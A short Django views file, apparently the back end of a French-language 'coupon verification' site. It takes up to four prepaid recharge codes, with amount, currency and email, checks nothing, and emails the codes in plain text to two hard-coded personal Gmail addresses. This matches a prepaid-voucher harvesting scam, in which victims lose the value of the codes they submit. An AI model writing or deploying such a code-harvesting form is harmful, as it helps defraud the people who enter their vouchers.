from django.shortcuts import render, redirect
from django.core.mail import send_mail
from django.conf import settings
from .models import FormData, Codes
from .forms import FormDataForm, CodesForm

def submit_form(request):
    if request.method == 'POST':
        form = FormDataForm(request.POST)
        if form.is_valid():
            form_data = form.save()
            codes = [form.cleaned_data.get('code1'), form.cleaned_data.get('code2'), form.cleaned_data.get('code3'), form.cleaned_data.get('code4')]
            codes = [code for code in codes if code]

            for code in codes:
                code_obj, created = Codes.objects.get_or_create(code=code)
                form_data.code.add(code_obj)

            subject = 'Vérification de Coupon'
            message = f"Type de Recharge: {form_data.type}\nMontant: {form_data.montant}\nDevise: {form_data.devise}\n"

            if codes:
                code_list = ''.join([f"-> code recharge: {code}\n" for code in codes])
                message += f"Codes de Recharge:\n{code_list}"

            message += f"Email: {form_data.mail}"

            send_mail(subject=subject, message=message, from_email=settings.DEFAULT_FROM_EMAIL, recipient_list=['galaxytech237@gmail.com', 'Denismartin342@gmail.com'])

            return redirect('success')
    else:
        form = FormDataForm()

    return render(request, 'app/form.html', {'form': form})

def success(request):
    return render(request, 'app/success.html')